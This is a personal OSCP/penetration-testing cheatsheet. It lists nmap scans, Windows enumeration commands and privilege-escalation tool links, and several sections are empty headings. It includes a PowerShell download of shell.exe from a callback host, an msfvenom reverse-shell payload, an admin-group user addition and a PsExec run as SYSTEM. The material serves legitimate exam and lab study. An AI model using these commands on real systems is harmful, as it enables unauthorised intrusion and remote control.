# Pentest Toolkit / OSCP Cheatsheet

imma just throw things that work in here

# Table of Contents

+ [Reconaissance](#reconaissance)
    1. [Port Scanning](#port-scanning)
    2. [Directory Enumeration](#directory-enumeration)
    3. [Header Analysis](#header-analysis)
+ [Exploitation](#exploitation)
+ [Post-Exploitation Enumeration](#post-exploitation)
+ [Privilege Escalation](#privilege-escalation)
    1. [Linux](#linux-privesc)
    2. [Windows](#windows-privesc)
        - The Basics
        - Payloads
        - Privesc Enumeration Tools


## Reconaissance

### Port Scanning
#### Full TCP scan
```bash
sudo nmap -sC -sV -O --open -p- -oA full-tcp [targets]
```

#### Full UDP Scanning
```bash
sudo nmap -sU -p- -oA full-udp [targets]
```

#### NSE Scripts with Ports
```bash
sudo nmap --scripts vuln,safe,discovery -p \[ports] [targets]
```

### Directory Enumeration

### Header Analysis

## Exploitation
## Post-Exploitation

### File Transfers

#### From Cmd.exe

```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.2:8080/shell.exe','C:\Users\Public\shell.exe')
```


## Privilege Escalation 

### Linux Privesc

First and foremost, [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation) is more comprehensive than the commands I will list here.

### Windows Privesc

[FuzzySecurity's blog post](https://www.fuzzysecurity.com/tutorials/16.html)

[Tib3rius's Windows PrivEsc course](https://www.udemy.com/course/windows-privilege-escalation/)
- **The Basics**

**Your User**
```bash
whoami
whoami /priv
net user [user]
```
**System Config**
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
netstat -ano
tasklist /SVC
```


- **Payloads**

### msfvenom executable payload

```bash
msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.2 LPORT=4444 -f exe -o reverse.exe
```

RDP- add user to administrators group first

```bash
net localgroup administrators [user] /add
```

PsExec from Windows Sysinternals

```bash
.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe
```

- **PrivEsc Enumeration Tools**

[PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1):
```bash
powershell -exec bypass
. .\PowerUp.ps1
Invoke-Allchecks
```

[SharpUp](https://github.com/GhostPack/SharpUp):
```bash
.\SharpUp.exe
```

[SeatBelt](https://github.com/GhostPack/Seatbelt) (more verbose, less targeted at privesc):
```bash
.\SeatBelt.exe all
.\SeatBelt.exe Nonstandard
```

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS):
List checks
```bash
.\winPEASany.exe -h
```
Single check
```bash
.\winPEASany.exe userinfo
```
All checks
```bash
.\winPEASany.exe
```


